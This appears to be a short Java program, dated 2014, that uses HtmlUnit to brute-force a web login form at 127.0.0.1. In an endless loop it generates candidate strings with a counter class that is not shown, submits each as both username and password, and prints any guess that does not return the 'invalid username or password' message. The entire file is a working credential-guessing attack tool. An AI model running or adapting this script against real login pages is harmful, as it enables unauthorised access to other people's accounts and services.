import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.*;

/**
 * Created by Алексей on 25.07.2014.
 */
public class Main {
  private static final WebClient WEB_CLIENT = new WebClient();
  private static final String LOGIN_URL = "http://127.0.0.1";
  private static final long SLEEP = 30 * 1000; // sleep timeout in milis

  public static void main(String args[]) {
    BruteForce bf = new BruteForce(3);
    String attempt = "1d" + bf.toString();

    while (true) {
      try {
        if (connect(attempt)) {
          System.out.println(attempt); Thread.sleep(SLEEP);
        }
      } catch (Exception e) {
        e.printStackTrace();
        try { Thread.sleep(SLEEP); } catch (InterruptedException ignore) {}
        continue;
      }

      bf.increment();
      attempt = "1d" + bf.toString();
    }
  }

  private static boolean connect(String password) throws Exception {
    HtmlPage page = WEB_CLIENT.getPage(LOGIN_URL);
    HtmlForm form = page.getFormByName("form");

    HtmlInput login = form.getInputByName("login");
    HtmlPasswordInput pwd = form.getInputByName("password");
    HtmlSubmitInput submit = form.getInputByValue("submit");

    login.setValueAttribute(password);
    pwd.setText(password);

    Page result = submit.click();
    String response = result.getWebResponse().getContentAsString();
    return getIn(response);
  }

  private static boolean getIn(String response) {
    return !response.contains("invalid username or password");
  }
}
